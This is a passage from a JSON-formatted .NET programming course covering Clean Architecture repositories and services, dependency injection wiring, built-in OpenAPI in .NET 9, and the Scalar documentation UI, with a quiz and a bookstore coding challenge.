.HasMaxLength(50);\n\n        builder.Property(p => p.CreatedAt)\n            .IsRequired();\n\n        // Index for common queries\n        builder.HasIndex(p => p.Status);\n        builder.HasIndex(p => p.Name);\n    }\n}\n\n\n// ========== REPOSITORIES ==========\n\nnamespace ShopFlow.Infrastructure.Repositories;\n\npublic class ProductRepository : IProductRepository\n{\n    private readonly AppDbContext _context;\n\n    public ProductRepository(AppDbContext context)\n    {\n        _context = context;\n    }\n\n    public async Task<Product?> GetByIdAsync(\n        int id, \n        CancellationToken cancellationToken = default)\n    {\n        return await _context.Products\n            .FirstOrDefaultAsync(p => p.Id == id, cancellationToken);\n    }\n\n    public async Task<IReadOnlyList<Product>> GetAllAsync(\n        CancellationToken cancellationToken = default)\n    {\n        return await _context.Products\n            .AsNoTracking()\n            .ToListAsync(cancellationToken);\n    }\n\n    public async Task<IReadOnlyList<Product>> GetByCategoryAsync(\n        int categoryId, \n        CancellationToken cancellationToken = default)\n    {\n        return await _context.Products\n            .AsNoTracking()\n            .Where(p => p.CategoryId == categoryId)\n            .ToListAsync(cancellationToken);\n    }\n\n    public async Task AddAsync(\n        Product product, \n        CancellationToken cancellationToken = default)\n    {\n        await _context.Products.AddAsync(product, cancellationToken);\n    }\n\n    public Task UpdateAsync(\n        Product product, \n        CancellationToken cancellationToken = default)\n    {\n        _context.Products.Update(product);\n        return Task.CompletedTask;\n    }\n\n    public async Task<bool> ExistsAsync(\n        int id, \n        CancellationToken cancellationToken = default)\n    {\n        return await _context.Products\n            .AnyAsync(p => p.Id == id, cancellationToken);\n    }\n}\n\n\n// ========== EXTERNAL SERVICES ==========\n\nnamespace ShopFlow.Infrastructure.Services;\n\npublic class SendGridEmailService : IEmailService\n{\n    private readonly ISendGridClient _client;\n    private readonly ILogger<SendGridEmailService> _logger;\n    private readonly EmailSettings _settings;\n\n    public SendGridEmailService(\n        ISendGridClient client,\n        IOptions<EmailSettings> settings,\n        ILogger<SendGridEmailService> logger)\n    {\n        _client = client;\n        _settings = settings.Value;\n        _logger = logger;\n    }\n\n    public async Task SendOrderConfirmationAsync(\n        int orderId,\n        string customerEmail,\n        string customerName,\n        CancellationToken cancellationToken = default)\n    {\n        var message = new SendGridMessage\n        {\n            From = new EmailAddress(_settings.FromEmail, _settings.FromName),\n            Subject = $\"Order #{orderId} Confirmation\",\n            TemplateId = _settings.OrderConfirmationTemplateId\n        };\n\n        message.AddTo(new EmailAddress(customerEmail, customerName));\n        message.SetTemplateData(new { order_id = orderId, customer_name = customerName });\n\n        try\n        {\n            var response = await _client.SendEmailAsync(message, cancellationToken);\n            \n            if (!response.IsSuccessStatusCode)\n            {\n                _logger.LogWarning(\n                    \"Failed to send order confirmation email for order {OrderId}\", \n                    orderId);\n            }\n        }\n        catch (Exception ex)\n        {\n            _logger.LogError(ex, \n                \"Error sending order confirmation email for order {OrderId}\", \n                orderId);\n            throw;\n        }\n    }\n}\n\n\nnamespace ShopFlow.Infrastructure.Services;\n\npublic class StripePaymentGateway : IPaymentGateway\n{\n    private readonly PaymentIntentService _paymentIntentService;\n    private readonly ILogger<StripePaymentGateway> _logger;\n\n    public StripePaymentGateway(\n        PaymentIntentService paymentIntentService,\n        ILogger<StripePaymentGateway> logger)\n    {\n        _paymentIntentService = paymentIntentService;\n        _logger = logger;\n    }\n\n    public async Task<PaymentResult> ProcessPaymentAsync(\n        int orderId,\n        Money amount,\n        string paymentMethodId,\n        CancellationToken cancellationToken = default)\n    {\n        var options = new PaymentIntentCreateOptions\n        {\n            Amount = (long)(amount.Amount * 100), // Stripe uses cents\n            Currency = amount.Currency.ToLowerInvariant(),\n            PaymentMethod = paymentMethodId,\n            Confirm = true,\n            Metadata = new Dictionary<string, string>\n            {\n                { \"order_id\", orderId.ToString() }\n            }\n        };\n\n        try\n        {\n            var intent = await _paymentIntentService.CreateAsync(\n                options, \n                cancellationToken: cancellationToken);\n\n            return new PaymentResult(\n                intent.Status == \"succeeded\",\n                intent.Id,\n                intent.Status == \"succeeded\" ? null : \"Payment not confirmed\");\n        }\n        catch (StripeException ex)\n        {\n            _logger.LogError(ex, \"Stripe payment failed for order {OrderId}\", orderId);\n            return new PaymentResult(false, null, ex.Message);\n        }\n    }\n}",
              "language": "csharp"
            },
            {
              "type": "REAL_WORLD",
              "title": "Wiring It All Together",
              "content": "## Dependency Injection Configuration in Program.cs\n\nThe final piece of Clean Architecture is wiring everything together using Dependency Injection. This happens in the Presentation layer's Program.cs, where we register all our services.",
              "code": "// ===== PROGRAM.CS - WIRING CLEAN ARCHITECTURE =====\n\n// File: src/ShopFlow.API/Program.cs\n\nusing ShopFlow.Application;\nusing ShopFlow.Infrastructure;\n\nvar builder = WebApplication.CreateBuilder(args);\n\n// ========== LAYER-SPECIFIC REGISTRATIONS ==========\n\n// Application Layer services\nbuilder.Services.AddApplicationServices();\n\n// Infrastructure Layer services (includes Database, External APIs)\nbuilder.Services.AddInfrastructureServices(builder.Configuration);\n\n// Presentation Layer services\nbuilder.Services.AddControllers();\nbuilder.Services.AddEndpointsApiExplorer();\nbuilder.Services.AddOpenApi();\n\nvar app = builder.Build();\n\n// ... middleware configuration ...\n\napp.Run();\n\n\n// ========== APPLICATION LAYER EXTENSION ==========\n\n// File: src/ShopFlow.Application/DependencyInjection.cs\n\nnamespace ShopFlow.Application;\n\npublic static class DependencyInjection\n{\n    public static IServiceCollection AddApplicationServices(\n        this IServiceCollection services)\n    {\n        // MediatR for CQRS\n        services.AddMediatR(cfg => {\n            cfg.RegisterServicesFromAssembly(typeof(DependencyInjection).Assembly);\n        });\n\n        // FluentValidation\n        services.AddValidatorsFromAssembly(typeof(DependencyInjection).Assembly);\n\n        // AutoMapper\n        services.AddAutoMapper(typeof(DependencyInjection).Assembly);\n\n        // Pipeline behaviors\n        services.AddTransient(\n            typeof(IPipelineBehavior<,>), \n            typeof(ValidationBehavior<,>));\n        \n        services.AddTransient(\n            typeof(IPipelineBehavior<,>), \n            typeof(LoggingBehavior<,>));\n\n        return services;\n    }\n}\n\n\n// ========== INFRASTRUCTURE LAYER EXTENSION ==========\n\n// File: src/ShopFlow.Infrastructure/DependencyInjection.cs\n\nnamespace ShopFlow.Infrastructure;\n\npublic static class DependencyInjection\n{\n    public static IServiceCollection AddInfrastructureServices(\n        this IServiceCollection services,\n        IConfiguration configuration)\n    {\n        // ===== DATABASE =====\n        services.AddDbContext<AppDbContext>(options =>\n            options.UseSqlServer(\n                configuration.GetConnectionString(\"DefaultConnection\"),\n                sqlOptions => sqlOptions.MigrationsAssembly(\n                    typeof(AppDbContext).Assembly.FullName)));\n\n        // Register DbContext as IUnitOfWork\n        services.AddScoped<IUnitOfWork>(provider => \n            provider.GetRequiredService<AppDbContext>());\n\n        // ===== REPOSITORIES =====\n        services.AddScoped<IProductRepository, ProductRepository>();\n        services.AddScoped<IOrderRepository, OrderRepository>();\n        services.AddScoped<ICategoryRepository, CategoryRepository>();\n        services.AddScoped<ICustomerRepository, CustomerRepository>();\n\n        // ===== EXTERNAL SERVICES =====\n        \n        // Email (SendGrid)\n        services.Configure<EmailSettings>(\n            configuration.GetSection(\"Email\"));\n        services.AddScoped<ISendGridClient>(_ => \n            new SendGridClient(configuration[\"Email:ApiKey\"]));\n        services.AddScoped<IEmailService, SendGridEmailService>();\n\n        // Payments (Stripe)\n        StripeConfiguration.ApiKey = configuration[\"Stripe:SecretKey\"];\n        services.AddScoped<PaymentIntentService>();\n        services.AddScoped<IPaymentGateway, StripePaymentGateway>();\n\n        // Date/Time abstraction\n        services.AddSingleton<IDateTimeService, DateTimeService>();\n\n        // Current user (from HttpContext)\n        services.AddScoped<ICurrentUserService, CurrentUserService>();\n\n        return services;\n    }\n}\n\n\n// ========== USING THE SERVICES ==========\n\n// File: src/ShopFlow.API/Controllers/ProductsController.cs\n\nnamespace ShopFlow.API.Controllers;\n\n[ApiController]\n[Route(\"api/[controller]\")]\npublic class ProductsController : ControllerBase\n{\n    private readonly IMediator _mediator;\n\n    public ProductsController(IMediator mediator)\n    {\n        _mediator = mediator;\n    }\n\n    [HttpPost]\n    public async Task<ActionResult<CreateProductResult>> Create(\n        CreateProductCommand command,\n        CancellationToken cancellationToken)\n    {\n        var result = await _mediator.Send(command, cancellationToken);\n        return CreatedAtAction(\n            nameof(GetById), \n            new { id = result.ProductId }, \n            result);\n    }\n\n    [HttpGet(\"{id}\")]\n    public async Task<ActionResult<ProductDto>> GetById(\n        int id,\n        CancellationToken cancellationToken)\n    {\n        var query = new GetProductQuery(id);\n        var result = await _mediator.Send(query, cancellationToken);\n        \n        return result is null \n            ? NotFound() \n            : Ok(result);\n    }\n}\n\n\n/*\n========== THE FLOW AT RUNTIME ==========\n\n1. Request arrives: POST /api/products with JSON body\n\n2. Controller receives CreateProductCommand (model binding)\n\n3. MediatR routes to CreateProductHandler\n\n4. Handler uses injected IProductRepository\n   - At runtime, this is ProductRepository (EF Core)\n   - Handler doesn't know it's EF Core!\n\n5. Handler creates Product entity (Domain)\n\n6. Repository saves to database\n\n7. Handler returns DTO (Application)\n\n8. Controller returns HTTP response (Presentation)\n\n========== TESTING BENEFITS ==========\n\nUnit test for CreateProductHandler:\n- Mock IProductRepository (no database needed)\n- Mock IUnitOfWork\n- Test pure business logic\n\nIntegration test:\n- Use real EF Core with in-memory or test database\n- Test the whole flow\n*/",
              "language": "csharp"
            }
          ],
          "challenges": [
            {
              "type": "QUIZ",
              "id": "lesson-18-04-challenge-01",
              "title": "DbContext Layer Placement",
              "description": "Test your understanding of where Entity Framework Core components belong in Clean Architecture.",
              "question": "You're building a Clean Architecture application with Entity Framework Core. Where should the AppDbContext class (which inherits from DbContext) be defined?",
              "options": [
                "Domain Layer - because it works with domain entities",
                "Application Layer - because handlers need it to save data",
                "Infrastructure Layer - because it's an external framework concern",
                "Presentation Layer - because that's where Program.cs registers it"
              ],
              "correctAnswer": 2,
              "explanation": "The AppDbContext class belongs in the Infrastructure Layer. Entity Framework Core is an external framework that handles data persistence - this is an infrastructure concern, not core business logic. The Domain layer should have no knowledge of how data is stored. The Application layer defines interfaces (like IProductRepository) but doesn't know about EF Core. The Presentation layer only configures dependency injection, it doesn't implement data access. By placing DbContext in Infrastructure, you maintain the dependency rule: Infrastructure depends on Application, not the other way around. If you ever need to switch from EF Core to Dapper or another ORM, only Infrastructure changes.",
              "difficulty": "intermediate"
            }
          ]
        }
      ]
    },
    {
      "id": "module-19",
      "title": "Modern API Development with OpenAPI & Scalar",
      "description": "Document and test your APIs professionally. Learn OpenAPI specification, Scalar UI, API versioning, and generating type-safe clients.",
      "difficulty": "advanced",
      "estimatedHours": 2,
      "lessons": [
        {
          "id": "lesson-19-01",
          "title": "OpenAPI in .NET 9 (Built-in Support)",
          "moduleId": "module-19",
          "order": 1,
          "estimatedMinutes": 25,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine you're opening a restaurant and need to create a menu for your customers:\n\nOLD WAY (No Documentation):\n- Customers ask waiter: 'What do you serve?'\n- Waiter describes dishes from memory\n- Different waiters give different answers\n- Customers confused, order wrong things\n\nOPENAPI WAY (Standardized Menu):\n- Printed menu with ALL dishes\n- Photos, ingredients, prices listed\n- Allergen information included\n- Same menu for everyone - no confusion!\n\nAPI DOCUMENTATION EXPLAINED:\n\nBEFORE OPENAPI:\n1. API exists but clients don't know endpoints\n2. Developers read code or ask questions\n3. Documentation gets outdated quickly\n4. Each team documents differently\n\nWITH OPENAPI:\n1. Standardized specification (JSON/YAML)\n2. Auto-generated from your code\n3. Always in sync with actual API\n4. Tools can read and use it (code gen, testing)\n\n.NET 9 BUILT-IN SUPPORT:\n- No Swashbuckle package needed!\n- builder.Services.AddOpenApi() - that's it!\n- app.MapOpenApi() exposes the spec\n- Works with Minimal APIs and Controllers\n\nBENEFITS:\n- Pro: Self-documenting APIs\n- Pro: Generate client code automatically\n- Pro: Interactive testing UIs\n- Pro: Validate requests/responses\n- Pro: API contract for teams\n\nThink: 'OpenAPI is your API's menu - customers know exactly what's available and how to order!'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// ===== .NET 9 BUILT-IN OPENAPI SUPPORT =====\n// No Swashbuckle needed!\n\nusing Microsoft.AspNetCore.OpenApi;\n\nvar builder = WebApplication.CreateBuilder(args);\n\n// Add OpenAPI services - that's it!\nbuilder.Services.AddOpenApi();\n\nvar app = builder.Build();\n\n// Expose OpenAPI document at /openapi/v1.json\napp.MapOpenApi();\n\n// ===== WELL-DOCUMENTED ENDPOINTS =====\n\n// Simple GET with metadata\napp.MapGet(\"/products\", () => \n{\n    return new[]\n    {\n        new Product(1, \"Laptop\", 999.99m),\n        new Product(2, \"Mouse\", 29.99m)\n    };\n})\n.WithName(\"GetProducts\")\n.WithDescription(\"Returns all available products in the catalog\")\n.WithTags(\"Products\")\n.Produces<Product[]>(StatusCodes.Status200OK);\n\n// GET with path parameter\napp.MapGet(\"/products/{id}\", (int id) =>\n{\n    if (id <= 0) return Results.BadRequest(\"Invalid ID\");\n    return Results.Ok(new Product(id, \"Sample Product\", 49.99m));\n})\n.WithName(\"GetProductById\")\n.WithDescription(\"Returns a specific product by its unique identifier\")\n.WithTags(\"Products\")\n.Produces<Product>(StatusCodes.Status200OK)\n.Produces(StatusCodes.Status400BadRequest)\n.Produces(StatusCodes.Status404NotFound);\n\n// POST with request body\napp.MapPost(\"/products\", (CreateProductRequest request) =>\n{\n    var product = new Product(Random.Shared.Next(1000), request.Name, request.Price);\n    return Results.Created($\"/products/{product.Id}\", product);\n})\n.WithName(\"CreateProduct\")\n.WithDescription(\"Creates a new product in the catalog\")\n.WithTags(\"Products\")\n.Accepts<CreateProductRequest>(\"application/json\")\n.Produces<Product>(StatusCodes.Status201Created)\n.Produces(StatusCodes.Status400BadRequest);\n\n// PUT with path parameter and body\napp.MapPut(\"/products/{id}\", (int id, UpdateProductRequest request) =>\n{\n    return Results.Ok(new Product(id, request.Name, request.Price));\n})\n.WithName(\"UpdateProduct\")\n.WithDescription(\"Updates an existing product\")\n.WithTags(\"Products\")\n.Accepts<UpdateProductRequest>(\"application/json\")\n.Produces<Product>(StatusCodes.Status200OK)\n.Produces(StatusCodes.Status404NotFound);\n\n// DELETE endpoint\napp.MapDelete(\"/products/{id}\", (int id) =>\n{\n    return Results.NoContent();\n})\n.WithName(\"DeleteProduct\")\n.WithDescription(\"Removes a product from the catalog\")\n.WithTags(\"Products\")\n.Produces(StatusCodes.Status204NoContent)\n.Produces(StatusCodes.Status404NotFound);\n\napp.Run();\n\n// ===== DATA MODELS =====\n\npublic record Product(int Id, string Name, decimal Price);\n\npublic record CreateProductRequest(string Name, decimal Price);\n\npublic record UpdateProductRequest(string Name, decimal Price);\n\n// ===== OPENAPI OUTPUT (openapi/v1.json) =====\n// {\n//   \"openapi\": \"3.0.1\",\n//   \"info\": { \"title\": \"MyApi\", \"version\": \"1.0\" },\n//   \"paths\": {\n//     \"/products\": {\n//       \"get\": {\n//         \"operationId\": \"GetProducts\",\n//         \"description\": \"Returns all available products...\",\n//         \"tags\": [\"Products\"],\n//         \"responses\": { \"200\": { ... } }\n//       }\n//     }\n//   }\n// }",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`builder.Services.AddOpenApi()`**: Registers OpenAPI services in the DI container. This is the .NET 9 built-in method - no external packages needed! Analyzes your endpoints at startup.\n\n**`app.MapOpenApi()`**: Exposes the OpenAPI specification at `/openapi/v1.json`. Clients and tools can fetch this document to understand your API.\n\n**`.WithName(\"GetProducts\")`**: Sets the operationId in OpenAPI. Used for code generation - this becomes the method name in generated clients.\n\n**`.WithDescription(\"...\")`**: Human-readable description shown in documentation UIs. Explain what the endpoint does, not how.\n\n**`.WithTags(\"Products\")`**: Groups endpoints in the documentation. All 'Products' endpoints appear together in Swagger/Scalar UI.\n\n**`.Produces<T>(statusCode)`**: Declares what the endpoint returns. T is the response type, statusCode is the HTTP status. Enables accurate documentation.\n\n**`.Accepts<T>(contentType)`**: Declares what request body the endpoint expects. Used for POST/PUT methods.\n\n**`StatusCodes.Status200OK`**: Strongly-typed status codes. Use these instead of magic numbers (200, 201, 404) for clarity."
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "**No UI Included**: Unlike Swashbuckle, Microsoft.AspNetCore.OpenApi only generates the OpenAPI document - it does NOT include Swagger UI or any visualization. You need Scalar.AspNetCore or another UI package to view the documentation interactively.\n\n**TypedResults vs IResult**: When using `TypedResults` (like `TypedResults.Ok()`), OpenAPI metadata is automatically inferred. But when returning `IResult` or using `Results.Ok()`, you MUST manually add `.Produces<T>()` or the response types won't appear in documentation.\n\n**NSwag Still Has Value**: While .NET 9's built-in OpenAPI is great for document generation, NSwag still excels at client code generation. Consider using both: Microsoft.AspNetCore.OpenApi for the spec, NSwag/Kiota for generating typed clients.\n\n**Controllers Need Extra Work**: The built-in OpenAPI works best with Minimal APIs. For controllers, you may still need `[ProducesResponseType]` attributes and additional configuration for complete documentation.\n\n**Breaking Change from Swashbuckle**: If migrating from Swashbuckle, note that `AddSwaggerGen()` and `UseSwagger()` are replaced by `AddOpenApi()` and `MapOpenApi()`. The configuration patterns are different - transformers replace operation filters."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-19-01-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create a well-documented Minimal API for a bookstore!\n\n1. Add OpenAPI services and map the OpenAPI endpoint\n\n2. Create these endpoints with full documentation:\n   - GET /books - Returns all books\n   - GET /books/{isbn} - Returns a book by ISBN\n   - POST /books - Creates a new book\n   - DELETE /books/{isbn} - Deletes a book\n\n3. Each endpoint needs:\n   - WithName (operation ID)\n   - WithDescription (what it does)\n   - WithTags (\"Books\")\n   - Appropriate Produces declarations\n\n4. Create Book record with: Isbn, Title, Author, Price\n\n5. Create CreateBookRequest with: Title, Author, Price",
              "starterCode": "var builder = WebApplication.CreateBuilder(args);\n\n// TODO: Add OpenAPI services\n\nvar app = builder.Build();\n\n// TODO: Map OpenAPI endpoint\n\n// Sample data\nvar books = new List<Book>\n{\n    new(\"978-0-13-468599-1\", \"Clean Code\", \"Robert Martin\", 39.99m),\n    new(\"978-0-596-51774-8\", \"JavaScript: The Good Parts\", \"Douglas Crockford\", 29.99m)\n};\n\n// TODO: GET /books - Return all books\n// - WithName(\"GetBooks\")\n// - WithDescription(\"Returns all books in the catalog\")\n// - WithTags(\"Books\")\n// - Produces<List<Book>>(StatusCodes.Status200OK)\n\n// TODO: GET /books/{isbn} - Return book by ISBN\n// - WithName(\"GetBookByIsbn\")\n// - WithDescription(\"Returns a specific book by ISBN\")\n// - WithTags(\"Books\")\n// - Produces<Book>(200), Produces(404)\n\n// TODO: POST /books - Create new book\n// - WithName(\"CreateBook\")\n// - WithDescription(\"Adds a new book to the catalog\")\n// - WithTags(\"Books\")\n// - Accepts<CreateBookRequest>, Produces<Book>(201)\n\n// TODO: DELETE /books/{isbn} - Delete book\n// - WithName(\"DeleteBook\")\n// - WithDescription(\"Removes a book from the catalog\")\n// - WithTags(\"Books\")\n// - Produces(204), Produces(404)\n\napp.Run();\n\n// TODO: Define Book record (Isbn, Title, Author, Price)\n// TODO: Define CreateBookRequest record (Title, Author, Price)",
              "solution": "var builder = WebApplication.CreateBuilder(args);\n\n// Add OpenAPI services (.NET 9 built-in!)\nbuilder.Services.AddOpenApi();\n\nvar app = builder.Build();\n\n// Expose OpenAPI document at /openapi/v1.json\napp.MapOpenApi();\n\n// Sample data\nvar books = new List<Book>\n{\n    new(\"978-0-13-468599-1\", \"Clean Code\", \"Robert Martin\", 39.99m),\n    new(\"978-0-596-51774-8\", \"JavaScript: The Good Parts\", \"Douglas Crockford\", 29.99m)\n};\n\n// GET /books - Return all books\napp.MapGet(\"/books\", () => books)\n    .WithName(\"GetBooks\")\n    .WithDescription(\"Returns all books in the catalog\")\n    .WithTags(\"Books\")\n    .Produces<List<Book>>(StatusCodes.Status200OK);\n\n// GET /books/{isbn} - Return book by ISBN\napp.MapGet(\"/books/{isbn}\", (string isbn) =>\n{\n    var book = books.FirstOrDefault(b => b.Isbn == isbn);\n    return book is not null \n        ? Results.Ok(book) \n        : Results.NotFound($\"Book with ISBN {isbn} not found\");\n})\n    .WithName(\"GetBookByIsbn\")\n    .WithDescription(\"Returns a specific book by its ISBN identifier\")\n    .WithTags(\"Books\")\n    .Produces<Book>(StatusCodes.Status200OK)\n    .Produces(StatusCodes.Status404NotFound);\n\n// POST /books - Create new book\napp.MapPost(\"/books\", (CreateBookRequest request) =>\n{\n    var isbn = $\"978-{Random.Shared.Next(1000000000):D10}\";\n    var book = new Book(isbn, request.Title, request.Author, request.Price);\n    books.Add(book);\n    return Results.Created($\"/books/{book.Isbn}\", book);\n})\n    .WithName(\"CreateBook\")\n    .WithDescription(\"Adds a new book to the catalog\")\n    .WithTags(\"Books\")\n    .Accepts<CreateBookRequest>(\"application/json\")\n    .Produces<Book>(StatusCodes.Status201Created)\n    .Produces(StatusCodes.Status400BadRequest);\n\n// DELETE /books/{isbn} - Delete book\napp.MapDelete(\"/books/{isbn}\", (string isbn) =>\n{\n    var book = books.FirstOrDefault(b => b.Isbn == isbn);\n    if (book is null)\n        return Results.NotFound($\"Book with ISBN {isbn} not found\");\n    \n    books.Remove(book);\n    return Results.NoContent();\n})\n    .WithName(\"DeleteBook\")\n    .WithDescription(\"Removes a book from the catalog\")\n    .WithTags(\"Books\")\n    .Produces(StatusCodes.Status204NoContent)\n    .Produces(StatusCodes.Status404NotFound);\n\nConsole.WriteLine(\"OpenAPI available at: /openapi/v1.json\");\napp.Run();\n\n// Data models\npublic record Book(string Isbn, string Title, string Author, decimal Price);\n\npublic record CreateBookRequest(string Title, string Author, decimal Price);",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Should add OpenAPI services",
                  "expectedOutput": "AddOpenApi",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Should map OpenAPI endpoint",
                  "expectedOutput": "MapOpenApi",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "builder.Services.AddOpenApi() registers the OpenAPI services - no external packages needed in .NET 9!"
                },
                {
                  "level": 2,
                  "text": "app.MapOpenApi() exposes the spec at /openapi/v1.json - call this before your endpoints."
                },
                {
                  "level": 3,
                  "text": "Chain methods: app.MapGet(...).WithName(...).WithDescription(...).WithTags(...).Produces(...);"
                },
                {
                  "level": 4,
                  "text": "For NotFound results, use: return Results.NotFound(message); and declare .Produces(StatusCodes.Status404NotFound)"
                },
                {
                  "level": 5,
                  "text": "POST should return Results.Created(uri, object) with .Produces<Book>(StatusCodes.Status201Created)"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Using Swashbuckle packages in .NET 9",
                  "consequence": "Swashbuckle is no longer needed! .NET 9 has built-in OpenAPI support that's lighter and faster.",
                  "correction": "Use builder.Services.AddOpenApi() and app.MapOpenApi() - no NuGet packages required."
                },
                {
                  "mistake": "Forgetting to declare all possible response types",
                  "consequence": "Documentation is incomplete. Clients don't know about error responses.",
                  "correction": "Add .Produces(StatusCodes.Status404NotFound) for endpoints that can return 404, etc."
                },
                {
                  "mistake": "Using magic numbers for status codes",
                  "consequence": "Less readable code. Easy to use wrong status code.",
                  "correction": "Use StatusCodes.Status200OK, Status201Created, Status404NotFound instead of 200, 201, 404."
                },
                {
                  "mistake": "Not providing meaningful operation names",
                  "consequence": "Generated clients have poor method names. Documentation is less clear.",
                  "correction": "Use descriptive WithName() values like 'GetBookByIsbn', 'CreateBook', 'DeleteBook'."
                }
              ],
              "difficulty": "advanced"
            }
          ]
        },
        {
          "id": "lesson-19-02",
          "title": "Scalar: Modern API Documentation UI",
          "moduleId": "module-19",
          "order": 2,
          "estimatedMinutes": 25,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Think of API documentation UIs like restaurant review apps:\n\nOLD SWAGGER UI:\n- Like an old restaurant website from 2010\n- Works, but looks dated\n- Basic features only\n- Same design for every restaurant\n\nSCALAR UI:\n- Like a modern food delivery app\n- Beautiful, intuitive design\n- Dark mode, customizable themes\n- Interactive examples and testing\n- Makes you WANT to explore the menu!\n\nWHY SCALAR OVER SWAGGER?\n\nSWAGGER UI (Traditional):\n- Industry standard for years\n- Functional but aging design\n- Limited customization\n- Heavy JavaScript bundle\n\nSCALAR (Modern Alternative):\n- Clean, modern aesthetic\n- Built-in dark mode\n- Better code examples (multiple languages)\n- Request/response side by side\n- Faster loading\n- Actively maintained\n\nUSER EXPERIENCE:\n- Developers ENJOY using Scalar\n- Better first impression of your API\n- Interactive testing built-in\n- Copy-paste ready code snippets\n\nINTEGRATION:\n- Works with any OpenAPI spec\n- Drop-in replacement for Swagger\n- Single NuGet package\n- One line to add: app.MapScalarApiReference()\n\nThink: 'Scalar is the modern, beautiful face of your API - making documentation a pleasure, not a chore!'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// ===== SCALAR: MODERN API DOCUMENTATION =====\n// Install: dotnet add package Scalar.AspNetCore\n\nusing Scalar.AspNetCore;\n\nvar builder = WebApplication.CreateBuilder(args);\n\n// .NET 9 built-in OpenAPI\nbuilder.Services.AddOpenApi();\n\nvar app = builder.Build();\n\n// Expose OpenAPI spec (required for Scalar)\napp.MapOpenApi();\n\n// Add Scalar UI - beautiful API documentation!\napp.MapScalarApiReference(options =>\n{\n    options\n        .WithTitle(\"My Bookstore API\")\n        .WithTheme(ScalarTheme.Purple)  // Built-in themes!\n        .WithDarkMode(true)              // Dark mode by default\n        .WithDefaultHttpClient(ScalarTarget.CSharp, ScalarClient.HttpClient)\n        .WithPreferredScheme(\"Bearer\");  // JWT auth hint\n});\n\n// ===== SAMPLE API ENDPOINTS =====\n\nvar products = new List<Product>\n{\n    new(1, \"Laptop Pro\", 1299.99m, \"Electronics\"),\n    new(2, \"Wireless Mouse\", 49.99m, \"Electronics\"),\n    new(3, \"Desk Lamp\", 39.99m, \"Home Office\")\n};\n\napp.MapGet(\"/products\", () => products)\n    .WithName(\"GetProducts\")\n    .WithDescription(\"Returns all available products\")\n    .WithTags(\"Products\")\n    .WithSummary(\"List all products\")\n    .Produces<List<Product>>(StatusCodes.Status200OK);\n\napp.MapGet(\"/products/{id}\", (int id) =>\n{\n    var product = products.FirstOrDefault(p => p.Id == id);\n    return product is not null \n        ? Results.Ok(product) \n        : Results.NotFound();\n})\n    .WithName(\"GetProductById\")\n    .WithDescription(\"Returns a product by its unique identifier\")\n    .WithTags(\"Products\")\n    .WithSummary(\"Get product by ID\")\n    .Produces<Product>(StatusCodes.Status200OK)\n    .Produces(StatusCodes.Status404NotFound);\n\napp.MapGet(\"/products/search\", (string? category, decimal? minPrice) =>\n{\n    var results = products.AsEnumerable();\n    \n    if (!string.IsNullOrEmpty(category))\n        results = results.Where(p => p.Category == category);\n    if (minPrice.HasValue)\n        results = results.Where(p => p.Price >= minPrice);\n    \n    return results.ToList();\n})\n    .WithName(\"SearchProducts\")\n    .WithDescription(\"Search products by category and/or minimum price\")\n    .WithTags(\"Products\")\n    .WithSummary(\"Search products\")\n    .Produces<List<Product>>(StatusCodes.Status200OK);\n\napp.MapPost(\"/products\", (CreateProductRequest request) =>\n{\n    var product = new Product(\n        products.Max(p => p.Id) + 1,\n        request.Name,\n        request.Price,\n        request.Category\n    );\n    products.Add(product);\n    return Results.Created($\"/products/{product.Id}\", product);\n})\n    .WithName(\"CreateProduct\")\n    .WithDescription(\"Creates a new product in the catalog\")\n    .WithTags(\"Products\")\n    .WithSummary(\"Create new product\")\n    .Accepts<CreateProductRequest>(\"application/json\")\n    .Produces<Product>(StatusCodes.Status201Created);\n\nConsole.WriteLine(\"API Documentation available at: /scalar/v1\");\napp.Run();\n\n// ===== MODELS =====\n\npublic record Product(int Id, string Name, decimal Price, string Category);\n\npublic record CreateProductRequest(string Name, decimal Price, string Category);\n\n// ===== SCALAR THEMES =====\n// ScalarTheme.Default   - Clean light theme\n// ScalarTheme.Purple    - Purple accent\n// ScalarTheme.Solarized - Solarized colors\n// ScalarTheme.BluePlanet - Blue accent\n// ScalarTheme.Saturn    - Dark with orange\n// ScalarTheme.Kepler    - Minimal design\n// ScalarTheme.Mars      - Red accent\n// ScalarTheme.DeepSpace - Dark mode\n\n// ===== CODE GENERATION TARGETS =====\n// ScalarTarget.CSharp, .JavaScript, .Python, .Curl, .Go, .Ruby, etc.\n// Users see ready-to-copy code in their preferred language!",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
